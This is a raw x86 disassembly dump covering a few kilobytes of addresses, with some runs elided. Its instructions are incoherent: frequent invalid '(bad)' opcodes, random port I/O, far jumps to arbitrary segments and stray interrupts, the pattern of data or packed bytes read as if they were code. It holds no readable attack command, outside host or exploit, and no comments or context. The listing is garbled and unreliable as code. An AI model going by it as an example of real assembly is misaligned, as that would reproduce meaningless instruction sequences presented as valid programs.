  41dd44:	or     esi,DWORD PTR [ecx+0x546e85a4]
  41dd4a:	xor    eax,0xc9213a6
  41dd4f:	addr16 push 0x1792f827
  41dd55:	imul   eax,edi,0xffffffd7
  41dd58:	add    al,BYTE PTR [eax+ebx*1-0x53]
  41dd5c:	loope  0x41dd5a
  41dd5e:	cwde   
  41dd5f:	xchg   BYTE PTR [edi],dh
  41dd61:	sub    eax,esp
  41dd63:	ret    
  41dd64:	cwde   
  41dd65:	popa   
  41dd66:	js     0x41dd4a
  41dd68:	inc    esi
  41dd69:	add    bl,BYTE PTR [edi+0x68]
  41dd6c:	mov    edx,esi
  41dd6e:	xchg   ecx,eax
  41dd6f:	and    al,0xd4
  41dd71:	push   ss
  41dd72:	pop    edx
  41dd73:	xchg   edx,eax
  41dd74:	sub    dl,dh
  41dd76:	outs   dx,DWORD PTR ds:[esi]
  41dd77:	mov    ?,WORD PTR [ebx]
  41dd79:	sahf   
  41dd7a:	dec    esp
  41dd7b:	in     eax,0xc4
  41dd7d:	fiadd  DWORD PTR [ecx-0x4f60176e]
  41dd83:	mov    edi,0x19b348da
  41dd88:	dec    ecx
  41dd89:	lea    ecx,[ebx]
  41dd8b:	pop    ds
  41dd8c:	lods   al,BYTE PTR ds:[esi]
  41dd8d:	icebp  
  41dd8e:	fwait
  41dd8f:	aas    
	...
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	stc    
  41de01:	aaa    
  41de02:	fld    TBYTE PTR [edi]
  41de04:	test   BYTE PTR ds:0x1040001,bh
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	std    
  41de0d:	ret    
  41de0e:	in     al,dx
  41de0f:	retf   
  41de10:	lods   al,BYTE PTR ds:[esi]
  41de11:	inc    ebx
  41de12:	ja     0x41dde2
  41de14:	xor    eax,0x885c5f63
  41de1a:	push   eax
  41de1b:	xlat   BYTE PTR ds:[ebx]
  41de1c:	jg     0x41de8c
  41de1e:	(bad)  
  41de1f:	scas   eax,DWORD PTR es:[edi]
  41de20:	mov    cl,0x4e
  41de22:	push   ss
  41de23:	int    0xf9
  41de25:	lahf   
  41de26:	stos   BYTE PTR es:[edi],al
  41de27:	pop    eax
  41de28:	inc    ebx
  41de29:	xchg   ebp,eax
  41de2a:	rcr    BYTE PTR [ebx],cl
  41de2c:	nop
  41de2d:	sbb    al,0xe2
  41de2f:	xchg   esp,eax
  41de30:	mov    ss,WORD PTR [edx+0x28]
  41de33:	lock and esp,DWORD PTR [eax]
  41de36:	adc    ecx,ebp
  41de38:	pop    es
  41de39:	mov    esp,0xee0abb5
  41de3e:	mov    ecx,DWORD PTR [esi-0x37b89fde]
  41de44:	cmp    BYTE PTR [edi+edx*1+0xe],ch
  41de48:	arpl   WORD PTR [edi+0x5b97b61c],si
  41de4e:	sbb    BYTE PTR [edi+0x2f07f9dc],0x75
  41de55:	or     eax,0xf47ec032
  41de5a:	xchg   BYTE PTR [ecx+0x5172d6a5],al
  41de60:	inc    edx
  41de61:	shr    DWORD PTR [ecx+0x68ec8e9e],0x5f
  41de68:	jno    0x41de84
  41de6a:	out    dx,al
  41de6b:	test   al,0x8e
  41de6d:	xor    al,0xf5
  41de6f:	int    0xa9
  41de71:	sbb    dl,BYTE PTR [ebx+0x17]
  41de74:	sub    cl,al
  41de76:	jbe    0x41de36
  41de78:	pushf  
  41de79:	add    eax,0xd682c08b
  41de7e:	xchg   esp,eax
  41de7f:	inc    eax
  41de80:	jle    0x41defa
  41de82:	mov    edi,0xbd87a936
  41de87:	cmp    BYTE PTR [esi+ebp*1-0x480e151],ch
  41de8e:	push   es
  41de8f:	jno    0x41de29
  41de91:	cld    
  41de92:	out    0xfa,eax
  41de94:	dec    edx
  41de95:	jns    0x41de47
  41de97:	lock repnz retf 
  41de9a:	adc    eax,0xfb3aeaf6
  41de9f:	retf   0x684a
  41dea2:	cmp    ebx,ebx
  41dea4:	lea    edx,[ecx+ecx*2+0x7c7a3ae5]
  41deab:	mul    BYTE PTR [eiz*8-0x71576bfc]
  41deb2:	cmp    eax,0xb4b512b3
  41deb7:	je     0x41df18
  41deb9:	add    ch,al
  41debb:	sti    
  41debc:	jp     0x41de6e
  41debe:	mov    edx,0xfcfbd440
  41dec3:	xor    al,0x61
  41dec5:	repnz out dx,al
  41dec7:	out    dx,eax
  41dec8:	inc    eax
  41dec9:	mov    ebp,0xf98a05b
  41dece:	and    ebp,DWORD PTR [ecx]
  41ded0:	lahf   
  41ded1:	rcr    BYTE PTR [edi+eiz*4+0xb],cl
  41ded5:	xchg   DWORD PTR [eax+0x4e1e848f],edx
  41dedb:	add    ebp,ecx
  41dedd:	push   edi
  41dede:	jo     0x41de80
  41dee0:	pop    esp
  41dee1:	add    BYTE PTR [ebx-0xf],ch
  41dee4:	or     ch,bh
  41dee6:	inc    ebp
  41dee7:	add    bh,BYTE PTR [edi]
  41dee9:	hlt    
  41deea:	push   ss
  41deeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41deec:	test   BYTE PTR ds:0xa12aa20c,ah
  41def2:	inc    esi
  41def3:	sti    
  41def4:	xchg   edx,eax
  41def5:	call   0x1a8d:0x9c2c9a03
  41defc:	add    al,0x74
  41defe:	clc    
  41deff:	jmp    0x79d0:0xf969afec
  41df06:	test   al,0x9c
  41df08:	sti    
  41df09:	jmp    0x41df63
  41df0b:	inc    edi
  41df0c:	mov    edx,0x8414d
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xdd2f9ce9
  41df82:	jecxz  0x41dfe1
  41df84:	mov    BYTE PTR [esi],bh
  41df86:	add    DWORD PTR [eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	push   cs
  41df8d:	xchg   BYTE PTR [esi-0x72],dl
  41df90:	adc    eax,0xe590bb1b
  41df95:	xor    eax,0xdeaec836
  41df9a:	push   cs
  41df9b:	inc    ebp
  41df9c:	in     eax,0xd4
  41df9e:	ins    BYTE PTR es:[edi],dx
  41df9f:	sub    DWORD PTR [ebx-0x77],edi
  41dfa2:	std    
  41dfa3:	ret    
  41dfa4:	js     0x41df5d
  41dfa6:	call   0xdb99:0x96b1f786
  41dfad:	(bad)  
  41dfae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfaf:	pop    ss
  41dfb0:	mov    bh,0x42
  41dfb2:	push   ds
  41dfb3:	lods   al,BYTE PTR ds:[esi]
  41dfb4:	iret   
  41dfb5:	sub    dh,bl
  41dfb7:	enter  0x1aa3,0xf3
  41dfbb:	ins    DWORD PTR es:[edi],dx
  41dfbc:	fadd   DWORD PTR [esi]
  41dfbe:	xor    al,0x14
  41dfc0:	push   ebx
  41dfc1:	or     ch,BYTE PTR [edx-0x48]
  41dfc4:	add    al,0x61
  41dfc6:	jae    0x41df7e
  41dfc8:	pop    edx
  41dfc9:	pop    edi
  41dfca:	or     cl,BYTE PTR [edi+0x18]
  41dfcd:	dec    edi
  41dfce:	imul   eax,DWORD PTR [ecx-0x76],0xbb69f74e
  41dfd5:	add    BYTE PTR [eax],dh
  41dfd7:	imul   edi,esp,0xfffffff3
  41dfda:	nop
  41dfdb:	push   eax
  41dfdc:	push   ecx
  41dfdd:	mov    WORD PTR [ecx+eax*8],?
  41dfe0:	je     0x41e011
  41dfe2:	cli    
  41dfe3:	push   0x51
  41dfe5:	mov    bh,0x87
  41dfe7:	int    0x6c
  41dfe9:	add    al,0xb7
  41dfeb:	in     eax,0xfe
  41dfed:	push   edx
  41dfee:	aaa    
  41dfef:	pop    ecx
  41dff0:	shl    esp,cl
  41dff2:	mov    eax,0x1d495874
  41dff7:	mov    ebx,0x419ef942
  41dffc:	cmp    al,0xad
  41dffe:	push   es
  41dfff:	int3   
  41e000:	sbb    al,0x5a
  41e002:	ins    DWORD PTR es:[edi],dx
  41e003:	aaa    
  41e004:	cmp    DWORD PTR cs:[ecx],esi
  41e007:	aad    0x46
  41e009:	mov    eax,DWORD PTR [edx]
  41e00b:	mov    eax,0x9617283
  41e010:	jae    0x41e05f
  41e012:	mov    dl,0xe0
  41e014:	(bad)  
  41e015:	out    0xe8,eax
  41e017:	dec    edx
  41e018:	test   eax,0x599cf614
  41e01d:	xlat   BYTE PTR ds:[ebx]
  41e01e:	jae    0x41e08b
  41e020:	sbb    ebp,DWORD PTR [esi]
  41e022:	out    dx,al
  41e023:	das    
  41e024:	sbb    esp,DWORD PTR [edi-0x4b774bfe]
  41e02a:	jge    0x41e04f
  41e02c:	sbb    eax,0x9da01c81
  41e031:	in     al,0x38
  41e033:	nop
  41e034:	stos   DWORD PTR es:[edi],eax
  41e035:	or     bl,0xd3
  41e038:	pusha  
  41e039:	(bad)  [ecx]
  41e03b:	sub    al,0x95
  41e03d:	pop    eax
  41e03e:	jns    0x41e01e
  41e040:	jl     0x41e03a
  41e042:	mov    ds:0x78140501,al
  41e047:	xor    esp,DWORD PTR [edi]
  41e049:	mov    dh,BYTE PTR [edx]
  41e04b:	sbb    cl,BYTE PTR [ebx-0x51]
  41e04e:	mov    dl,0xb9
  41e050:	sub    eax,0x1de9af26
  41e055:	mov    ds:0xb760825c,eax
  41e05a:	xor    esi,esp
  41e05c:	pushf  
  41e05d:	in     al,dx
  41e05e:	aas    
  41e05f:	imul   ecx,edx,0x68
  41e062:	add    ecx,DWORD PTR [eax+eiz*8-0x7d]
  41e066:	push   ss
  41e067:	call   0x8d70:0xd73a3341
  41e06e:	pop    eax
  41e06f:	xor    eax,0xe4b4c442
  41e074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e075:	loopne 0x41e0b0
  41e077:	push   ebx
  41e078:	push   ecx
  41e079:	and    edx,DWORD PTR [ebx+0x4a]
  41e07c:	and    al,0x3
  41e07e:	out    dx,eax
  41e07f:	pop    es
  41e080:	(bad)  
  41e081:	jecxz  0x41e01c
  41e083:	das    
  41e084:	dec    eax
  41e085:	jb     0x41e106
  41e087:	dec    ebx
  41e088:	es stos DWORD PTR es:[edi],eax
  41e08a:	add    BYTE PTR [ebx+0x25e640dd],bh
	...
  41e0f4:	dec    edi
  41e0f5:	push   ebx
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	adc    al,0x1f
  41e102:	cli    
  41e103:	jmp    0x104:0x13f8c
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	mov    DWORD PTR [ebx+0x3cbde68c],edi
  41e112:	dec    esi
  41e113:	bound  ecx,QWORD PTR [edx]
  41e115:	sbb    eax,0x7e1e78c7
  41e11a:	popa   
  41e11b:	pop    eax
  41e11c:	push   ebp
  41e11d:	bound  eax,QWORD PTR [esi-0xc]
  41e120:	lahf   
  41e121:	mov    esi,0x65b50496
  41e126:	fs rcl ah,1
  41e129:	fild   QWORD PTR [ebx+0x41]
  41e12c:	das    
  41e12d:	xor    al,0xaa
  41e12f:	and    ebp,edi
  41e131:	repnz cmp BYTE PTR [esi],dh
  41e134:	cmp    al,0xe0
  41e136:	xlat   BYTE PTR ds:[ebx]
  41e137:	mov    eax,ds:0x87a32339
  41e13c:	pop    ebp
  41e13d:	shr    cl,cl
  41e13f:	push   ebp
  41e140:	jns    0x41e0fc
  41e142:	retf   0x1f03
  41e145:	sahf   
  41e146:	daa    
  41e147:	popf   
  41e148:	xor    ch,bh
  41e14a:	sub    al,ah
  41e14c:	out    dx,al
  41e14d:	scas   al,BYTE PTR es:[edi]
  41e14e:	sbb    al,0x45
  41e150:	inc    esp
  41e151:	push   ss
  41e152:	hlt    
  41e153:	pop    ds
  41e154:	stos   BYTE PTR es:[edi],al
  41e155:	popa   
  41e156:	pop    es
  41e157:	je     0x41e130
  41e159:	mov    BYTE PTR [ebp-0x4b],ch
  41e15c:	xchg   ebp,eax
  41e15d:	or     BYTE PTR [esi+0xc],al
  41e160:	es adc edi,ebp
  41e163:	popa   
  41e164:	xlat   BYTE PTR ds:[ebx]
  41e165:	jnp    0x41e176
  41e167:	int    0x5c
  41e169:	jo     0x41e0ec
  41e16b:	int3   
  41e16c:	dec    edi
  41e16d:	lods   al,BYTE PTR ds:[esi]
  41e16e:	cdq    
  41e16f:	xchg   ebp,eax
  41e170:	neg    DWORD PTR [edx+edx*4+0x778372a]
  41e177:	fidiv  WORD PTR [ebx-0x60]
  41e17a:	mov    edx,0x7a45bf18
  41e17f:	dec    esi
  41e180:	lea    edx,[eax]
  41e182:	dec    edx
  41e183:	push   ds
  41e184:	repnz xor edi,DWORD PTR [ebx-0x1d1f8875]
  41e18b:	neg    edi
  41e18d:	xchg   ecx,eax
  41e18e:	push   0x5feb4295
  41e193:	dec    eax
  41e194:	pop    ebp
  41e195:	mov    bh,0xda
  41e197:	xor    dh,al
  41e199:	call   0x8f60:0x3b6e668b
  41e1a0:	in     eax,0xe0
  41e1a2:	imul   eax,ebx,0x3
  41e1a5:	jo     0x41e1c2
  41e1a7:	(bad)  
  41e1a8:	pop    edi
  41e1a9:	pop    ecx
  41e1aa:	adc    dl,0xda
  41e1ad:	jne    0x41e17f
  41e1af:	jns    0x41e1e8
  41e1b1:	ficomp DWORD PTR [edi]
  41e1b3:	int    0x49
  41e1b5:	cld    
  41e1b6:	mov    eax,ds:0x6583ba2a
  41e1bb:	sub    ecx,DWORD PTR [ebx]
  41e1bd:	jmp    FWORD PTR [ecx+edx*2]
  41e1c0:	das    
  41e1c1:	inc    esp
  41e1c2:	sbb    ah,BYTE PTR [edi+esi*4-0x29]
  41e1c6:	and    dl,BYTE PTR [edx-0x12]
  41e1c9:	(bad)  
  41e1ca:	hlt    
  41e1cb:	dec    ebx
  41e1cc:	leave  
  41e1cd:	in     eax,0x7e
  41e1cf:	retw   
  41e1d1:	stos   BYTE PTR es:[edi],al
  41e1d2:	aaa    
  41e1d3:	out    dx,eax
  41e1d4:	pop    ecx
  41e1d5:	(bad)  
  41e1d6:	icebp  
  41e1d7:	rcr    bh,cl
  41e1d9:	adc    al,0x43
  41e1db:	add    eax,0x9b080900
  41e1e0:	dec    ebp
  41e1e1:	dec    eax
  41e1e2:	stos   BYTE PTR es:[edi],al
  41e1e3:	in     al,dx
  41e1e4:	mov    DWORD PTR [esi+0x7],ecx
  41e1e7:	jmp    0x5973:0x32781b84
  41e1ee:	addr16 mov esi,0x8696c806
  41e1f4:	into   
  41e1f5:	hlt    
  41e1f6:	sbb    ebx,ebp
  41e1f8:	xchg   DWORD PTR [ecx-0x23],edi
  41e1fb:	fcomp  st(2)
  41e1fd:	ret    0x8ea
  41e200:	mov    ah,0xbc
  41e202:	adc    eax,0xdd5b8f9c
  41e207:	inc    ecx
  41e208:	add    BYTE PTR [esi+0x775fe668],0x2d
  41e20f:	js     0x41e211
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0x60
  41e281:	ds dec esp
  41e283:	or     DWORD PTR [eax+0x4000140],edx
  41e289:	add    DWORD PTR [eax],eax
  41e28b:	add    BYTE PTR [edx-0x7828e558],cl
  41e291:	(bad)  
  41e292:	sub    al,0xc
  41e294:	or     dl,0x2d
  41e297:	out    0x16,eax
  41e299:	jmp    0x2851faeb
  41e29e:	lea    eax,[eax]
  41e2a0:	mov    cl,0x9d
  41e2a2:	popf   
  41e2a3:	ins    DWORD PTR es:[edi],dx
  41e2a4:	imul   ebx,DWORD PTR [eax-0x7c87dff6],0xffffff89
  41e2ab:	mov    cl,0x7d
  41e2ad:	aad    0x5b
  41e2af:	out    0x40,eax
  41e2b1:	lahf   
  41e2b2:	aam    0x2
  41e2b4:	push   0xffffffae
  41e2b6:	add    edx,DWORD PTR [edx+ebp*4]
  41e2b9:	outs   dx,DWORD PTR ds:[esi]
  41e2ba:	(bad)  
  41e2bb:	and    eax,0x6844cfab
  41e2c0:	inc    esi
  41e2c1:	mov    bl,0x3c
  41e2c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2c4:	jno    0x41e29f
  41e2c6:	or     DWORD PTR [esi],esi
  41e2c8:	leave  
  41e2c9:	popf   
  41e2ca:	mov    ds:0xf07c6526,eax
  41e2cf:	lahf   
  41e2d0:	sbb    dh,0x15
  41e2d3:	mov    BYTE PTR ds:0xefdd8b5e,bl
  41e2d9:	push   cs
  41e2da:	mov    DWORD PTR [esi-0x17d3a0d3],esp
  41e2e0:	xor    ebp,esi
  41e2e2:	mov    DWORD PTR [ebx-0x56],edx
  41e2e5:	or     DWORD PTR [eax+ebx*1],esi
  41e2e8:	bound  eax,QWORD PTR [edx]
  41e2ea:	sbb    eax,0xa3a80da7
  41e2ef:	xor    ch,BYTE PTR [ecx-0x11]
  41e2f2:	clc    
  41e2f3:	ja     0x41e2e0
  41e2f5:	(bad)  
  41e2f6:	(bad)  
  41e2f7:	shl    DWORD PTR [edx-0x43],cl
  41e2fa:	(bad)  
  41e2fb:	comiss xmm1,xmm1
  41e2fe:	imul   ecx,edi,0xffffffef
  41e301:	jne    0x41e2d0
  41e303:	or     eax,0x54626e8d
  41e308:	dec    esi
  41e309:	mov    fs,WORD PTR [ebp+eax*8-0x13a548dc]
  41e310:	retf   
  41e311:	bound  ebp,QWORD PTR [edx+0x530dbca]
  41e317:	push   ebp
  41e318:	mov    BYTE PTR [ebp+0x19],dh
  41e31b:	hlt    
  41e31c:	lock sahf 
  41e31e:	xlat   BYTE PTR ds:[ebx]
  41e31f:	pop    es
  41e320:	xchg   DWORD PTR [ecx+eax*2-0x17],eax
  41e324:	inc    edx
  41e325:	add    eax,0xeba80579
  41e32a:	fdivr  QWORD PTR [eax+0x33]
  41e32d:	mov    ch,0xbd
  41e32f:	mov    eax,ds:0x804200f4
  41e334:	mov    ds:0x9f960c05,eax
  41e339:	xlat   BYTE PTR ds:[ebx]
  41e33a:	push   esi
  41e33b:	push   ss
  41e33c:	dec    eax
  41e33d:	jmp    0x41e324
  41e33f:	mov    al,0xbe
  41e341:	lods   eax,DWORD PTR ds:[esi]
  41e342:	xor    bh,BYTE PTR ds:0x1b8825a7
  41e348:	add    al,0x62
  41e34a:	push   ss
  41e34b:	mov    edi,0x2f763563
  41e350:	push   0xd187fe93
  41e355:	mov    esi,0xddc79230
  41e35a:	shr    ebx,0xa8
  41e35d:	sbb    al,0x5e
  41e35f:	pop    ebp
  41e360:	mov    eax,ds:0xe585452d
  41e365:	test   DWORD PTR [edx+eiz*8+0x6d],ecx
  41e369:	adc    eax,0x32d4a97d
  41e36e:	pop    ds
  41e36f:	mov    eax,0xf31061a3
  41e374:	jbe    0x41e32f
  41e376:	jecxz  0x41e328
  41e378:	dec    ecx
  41e379:	gs jne 0x41e36c
  41e37c:	int    0x2
  41e37e:	lods   eax,DWORD PTR ds:[esi]
  41e37f:	push   edi
  41e380:	or     DWORD PTR [edx-0x591e6aeb],0xd4226fec
  41e38a:	add    esp,DWORD PTR [ebp+0x4e]
  41e38d:	mov    bh,0xe5
  41e38f:	repz add BYTE PTR [eax],al
	...
  41e3f2:	add    BYTE PTR [eax],al
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xd35c2109
  41e403:	pushf  
  41e404:	xchg   esp,eax
  41e405:	inc    ecx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	pop    ds
  41e40d:	jne    0x41e3cb
  41e40f:	cs ss add bh,ch
  41e413:	push   0x7
  41e415:	mov    ?,WORD PTR [ebp-0x51]
  41e418:	inc    ebx
  41e419:	out    dx,al
  41e41a:	adc    ebp,DWORD PTR [esp+esi*2-0x34977c10]
  41e421:	xchg   edi,eax
  41e422:	ins    DWORD PTR es:[edi],dx
  41e423:	test   eax,0x408dd885
  41e428:	imul   esi,DWORD PTR [esi],0xffffff84
  41e42b:	scas   eax,DWORD PTR es:[edi]
  41e42c:	sbb    DWORD PTR [edi-0x729595c0],eax
  41e432:	sti    
  41e433:	pop    ebp
  41e434:	imul   ecx,DWORD PTR [eax],0x44
  41e437:	arpl   WORD PTR [eax],ax
  41e439:	xor    BYTE PTR [ecx-0x6f],bh
  41e43c:	cmp    ecx,DWORD PTR [esi]
  41e43e:	fild   WORD PTR [edi]
  41e440:	hlt    
  41e441:	ret    
  41e442:	jle    0x41e4b7
  41e444:	xchg   DWORD PTR [ecx+0x6d],esi
  41e447:	adc    BYTE PTR [edi+0x4f],cl
  41e44a:	pop    ebp
  41e44b:	jmp    0x41e49f
  41e44d:	add    DWORD PTR [esi],eax
  41e44f:	mov    WORD PTR [ebx+ebp*1],cs
  41e452:	push   0x4ed6f797
  41e457:	and    bl,BYTE PTR [edx+0x6a9829e6]
  41e45d:	xlat   BYTE PTR ds:[ebx]
  41e45e:	ins    DWORD PTR es:[edi],dx
  41e45f:	scas   al,BYTE PTR es:[edi]
  41e460:	cmp    BYTE PTR [esi-0x336ad615],bl
  41e466:	(bad)  
  41e467:	xchg   DWORD PTR [ebx+0x70],edi
  41e46a:	jp     0x41e487
  41e46c:	mov    ch,0xe
  41e46e:	push   esp
  41e46f:	cld    
  41e470:	out    0x8,eax
  41e472:	test   eax,0x8237f6d6
  41e477:	xor    cl,BYTE PTR [edi]
  41e479:	mov    ds:0xfa185df2,al
  41e47e:	fldcw  WORD PTR [edx-0x35b23369]
  41e484:	push   0x826096bf
  41e489:	repnz ins DWORD PTR es:[edi],dx
  41e48b:	fimul  WORD PTR [eax+edx*1+0x1d]
  41e48f:	or     eax,0xa6f9ff5f
  41e494:	and    al,0x15
  41e496:	shr    BYTE PTR [eax-0x73],1
  41e499:	bound  ebp,QWORD PTR [edi+0x72]
  41e49c:	lods   al,BYTE PTR ds:[esi]
  41e49d:	lds    esp,FWORD PTR ds:0x98bf7fb2
  41e4a3:	sbb    ebp,DWORD PTR [ebp+0x34a22a67]
  41e4a9:	arpl   di,si
  41e4ab:	mov    edx,DWORD PTR [ebx]
  41e4ad:	sub    esi,DWORD PTR cs:[edx-0x397b512c]
  41e4b4:	adc    bl,BYTE PTR [ebp-0x70]
  41e4b7:	cmc    
  41e4b8:	mov    ecx,0x174ef9e2
  41e4bd:	dec    ebx
  41e4be:	(bad)  
  41e4bf:	xor    DWORD PTR [edx+0x11],esi
  41e4c2:	daa    
  41e4c3:	mov    bh,0x4f
  41e4c5:	leave  
  41e4c6:	cmp    eax,0x3c4c2349
  41e4cb:	je     0x41e462
  41e4cd:	mov    fs,WORD PTR [esi-0x60]
  41e4d0:	adc    eax,0x2b90cc65
  41e4d5:	clc    
  41e4d6:	jmp    0xdc67:0x7dfc780f
  41e4dd:	add    eax,ebx
  41e4df:	xchg   ebp,eax
  41e4e0:	int    0x43
  41e4e2:	shl    esp,1
  41e4e4:	pop    eax
  41e4e5:	inc    ebp
  41e4e7:	mov    ds:0x9e299d61,al
  41e4ec:	mov    eax,0xf00c9905
  41e4f1:	hlt    
  41e4f2:	int3   
  41e4f3:	mov    ch,0xd
  41e4f5:	test   BYTE PTR [edx-0x6817588e],ah
  41e4fb:	arpl   WORD PTR [eax-0x36],di
  41e4fe:	jae    0x41e4e7
  41e500:	jbe    0x41e529
  41e502:	arpl   bp,sp
  41e504:	xchg   esi,eax
  41e505:	dec    esi
  41e506:	call   0xb687:0xdce5ae9f
  41e50d:	loopne 0x41e512
  41e50f:	lods   eax,DWORD PTR ds:[esi]
	...
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5e1
  41e581:	leave  
  41e582:	call   0x1847dcf
  41e587:	add    BYTE PTR [ecx+eax*1],al
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	or     al,cl
  41e58e:	add    ebp,edx
  41e590:	(bad)  
  41e591:	xor    bh,BYTE PTR [esi*1+0x3c4ad254]
  41e598:	pop    ebp
  41e599:	pop    edi
  41e59a:	imul   edx,ebp,0x35510c0a
  41e5a0:	fstp   TBYTE PTR [edi+ebp*1]
  41e5a3:	cdq    
  41e5a4:	call   0x42ba:0x84c5a549
  41e5ab:	xchg   ebx,eax
  41e5ac:	arpl   dx,si
  41e5ae:	aad    0x8
  41e5b0:	and    al,0xd2
  41e5b2:	cs jne 0x41e5f2
  41e5b5:	test   DWORD PTR [esi-0x13],esp
  41e5b8:	jecxz  0x41e600
  41e5ba:	mov    cl,BYTE PTR [eax+0x43]
  41e5bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5be:	scas   al,BYTE PTR es:[edi]
  41e5bf:	scas   eax,DWORD PTR es:[edi]
  41e5c0:	jmp    0x41e577
  41e5c2:	rcr    DWORD PTR [eax-0x1b],1
  41e5c5:	out    dx,al
  41e5c6:	push   eax
  41e5c7:	lods   eax,DWORD PTR ds:[esi]
  41e5c8:	sub    dl,dl
  41e5ca:	add    BYTE PTR [ebp-0x6881c7e],dh
  41e5d0:	in     eax,0x61
  41e5d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5d3:	(bad)  
  41e5d4:	(bad)  
  41e5d5:	cmc    
  41e5d6:	cmp    al,0x74
  41e5d8:	out    dx,eax
  41e5d9:	fisubr WORD PTR [ecx+0x48]
  41e5dc:	mov    bh,0x6d
  41e5de:	jecxz  0x41e59b
  41e5e0:	popf   
  41e5e1:	gs test al,0x7e
  41e5e4:	push   ss
  41e5e5:	mov    edx,0xf2421687
  41e5ea:	cwde   
  41e5eb:	dec    ebp
  41e5ec:	call   0x6e53:0xc612035d
  41e5f3:	cmp    al,0x19
  41e5f5:	sub    al,0x97
  41e5f7:	mov    al,0x6b
  41e5f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5fa:	or     al,0xf5
  41e5fc:	hlt    
  41e5fd:	cmp    bl,al
  41e5ff:	div    DWORD PTR [esp+edi*8+0x57aea875]
  41e606:	sub    cl,BYTE PTR [eax+ecx*4]
  41e609:	add    al,0x46
  41e60b:	aam    0xb0
  41e60d:	mov    ebp,0xeacd89e
  41e612:	sahf   
  41e613:	and    al,0x62
  41e615:	and    dh,BYTE PTR [edx+ebp*4]
  41e618:	lods   al,BYTE PTR ds:[esi]
  41e619:	aam    0x36
  41e61b:	int3   
  41e61c:	adc    BYTE PTR [ebx],ah
  41e61e:	push   ebx
  41e61f:	and    eax,0x690672c8
  41e624:	push   es
  41e625:	daa    
  41e626:	icebp  
  41e627:	cmp    al,0xcc
  41e629:	retf   
  41e62a:	loope  0x41e5b2
  41e62c:	cmp    DWORD PTR gs:[edx-0x17],edx
  41e630:	call   0x9d120f15
  41e635:	arpl   cx,ax
  41e637:	jle    0x41e633
  41e639:	out    dx,al
  41e63a:	fbstp  TBYTE PTR [edx-0xa]
  41e63d:	sbb    al,0xcb
  41e63f:	int    0x68
  41e641:	pop    ds
  41e642:	sbb    DWORD PTR gs:[esi-0x2d11a680],esi
  41e649:	ror    BYTE PTR [esi+0x132b431b],0xf8
  41e650:	lock ins DWORD PTR es:[edi],dx
  41e652:	test   BYTE PTR [ebp+0x5f9de867],bl
  41e658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e659:	xchg   ebx,eax
  41e65a:	ja     0x41e60c
  41e65c:	mov    ch,0xc9
  41e65e:	or     dl,BYTE PTR [edi+0x45608683]
  41e664:	inc    esi
  41e665:	cs inc esi
  41e667:	inc    edx
  41e668:	test   DWORD PTR [eax],esi
  41e66a:	fimul  DWORD PTR [ebx]
  41e66c:	adc    BYTE PTR [esi-0x78a6ddb0],ch
  41e672:	pop    edx
  41e673:	neg    esi
  41e675:	in     al,0x7c
  41e677:	aad    0x33
  41e679:	push   eax
  41e67a:	data16 or bl,al
  41e67d:	pop    esi
  41e67e:	fcmovnbe st,st(5)
  41e680:	cdq    
  41e681:	loop   0x41e657
  41e683:	in     ax,dx
  41e685:	dec    ebp
  41e686:	mov    edi,0xa9b842c9
  41e68b:	xor    BYTE PTR [esi+edi*2],0x18
  41e68f:	bound  eax,QWORD PTR [eax]
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ebp,DWORD PTR [eax+0x1a]
  41e702:	arpl   WORD PTR cs:[ebx+eax*2+0x1040001],bx
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	lods   al,BYTE PTR ds:[esi]
  41e70d:	mov    ah,0xdf
  41e70f:	clc    
  41e710:	rcl    DWORD PTR [edx+esi*2+0x328c512],cl
  41e717:	imul   ebx,DWORD PTR [edx],0xffffffb6
  41e71a:	dec    eax
  41e71b:	sub    al,cl
  41e71d:	neg    DWORD PTR [edi+0x305a421f]
  41e723:	mov    ds:0x7c530888,eax
  41e728:	fld    DWORD PTR [eax-0x11]
  41e72b:	imul   DWORD PTR [edi-0x5d6000c3]
  41e731:	mov    edi,0x3a34d252
